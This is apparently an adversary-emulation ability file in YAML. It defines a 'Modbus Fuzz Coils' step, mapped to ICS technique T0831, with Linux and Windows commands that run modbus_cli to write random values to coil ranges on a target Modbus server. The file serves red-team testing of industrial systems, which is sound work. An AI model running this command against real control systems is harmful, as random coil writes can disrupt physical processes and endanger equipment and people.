- id: 40f78a8f-2aaa-4b1b-872f-7c6b0f1ddf3e
  name: Modbus Fuzz Coils
  description: |
    Procedure
    Modbus Function 5 (0x05) Write Single Coil

    Writes random values to random coils over specified ranges. Addressing starts at 0 (e.g. coils 1-5 = addresses 0-4).
  tactic: impact
  technique:
    attack_id: T0831
    name: Manipulation of Control
  repeatable: True
  platforms:
    linux:
      sh:
        command:
          './modbus_cli #{modbus.server.ip} --port #{modbus.server.port} fuzz_c #{modbus.fuzz.coil.start} #{modbus.fuzz.coil.end} #{modbus.fuzz.coil.count} --wait #{modbus.fuzz.coil.wait}'
        payloads:
        - modbus_cli
    windows:
      psh:
        command:
         '.\modbus_cli.exe #{modbus.server.ip} --port #{modbus.server.port} fuzz_c #{modbus.fuzz.coil.start} #{modbus.fuzz.coil.end} #{modbus.fuzz.coil.count} --wait #{modbus.fuzz.coil.wait}'
        payloads:
        - modbus_cli.exe
